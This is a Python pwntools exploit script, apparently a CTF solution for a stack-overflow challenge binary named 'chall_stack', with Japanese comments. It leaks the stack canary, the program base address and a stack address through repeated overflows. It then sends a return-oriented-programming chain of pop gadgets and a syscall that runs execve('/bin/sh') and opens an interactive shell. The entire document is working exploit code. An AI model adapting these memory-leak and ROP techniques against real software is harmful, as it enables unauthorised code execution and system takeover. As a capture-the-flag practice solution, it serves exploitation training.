from pwn import *

context( os='linux', arch='amd64' )

#prog = "../shokai_security_contest/files/pwnable/99_challs/stack/chall_stack"
prog = "./chall_stack"

elf  = ELF( prog )
poprax  = 0x59a27
poprdi  = 0x9c3a
poprsi  = 0x177ce
poprdx  = 0x9b3f
syscall = 0x262a4

proc = process( prog )
#proc = gdb.debug( prog )

# canaryのリーク
proc.sendafter( '>> ', b'a' * 0x18 + b'!' )
proc.recvuntil( 'a!' )
canary = u64( b'\x00' + proc.recv(7) )
info( f"canary = 0x{canary:08X}" )

# プログラムバイナリのベースアドレスを求める
# (Saved RBP に格納されている __libc_csu_init から求める)
proc.sendafter( '>> ', b'a' * 0x1F + b'!' )
proc.recvuntil( 'a!' )
adrs = u64( proc.recv(6) + b'\x00\x00' )
base = adrs - 0xb180
info( f"adrs = 0x{adrs:08X}, base=0x{base:08X}" )

# スタックアドレスのリーク
proc.sendafter( '>> ', b'a' * 0x3F + b'!' )
proc.recvuntil( 'a!' )
adrs = u64( proc.recv(6) + b'\x00\x00' )
stack = adrs - 0x148
info( f"adrs = 0x{adrs:08X}, stack=0x{stack:08X}" )

ropchain  = b'a' * 0x10
ropchain += p64( 0x68732f6e69622f ) # "/bin/sh"
ropchain += p64( canary )
ropchain += p64( 0xdeadbeef )
ropchain += p64( base + poprax ) 
ropchain += p64( 0x3b )          # execve
ropchain += p64( base + poprdi ) 
ropchain += p64( stack )         # "/bin/sh"の格納先
ropchain += p64( base + poprsi ) 
ropchain += p64( 0x00 )          # execveの第2引数
ropchain += p64( base + poprdx ) 
ropchain += p64( 0x00 )          # execveの第3引数
ropchain += p64( base + syscall ) 

# シェルを取る
proc.sendafter( '>> ', ropchain )

proc.interactive()
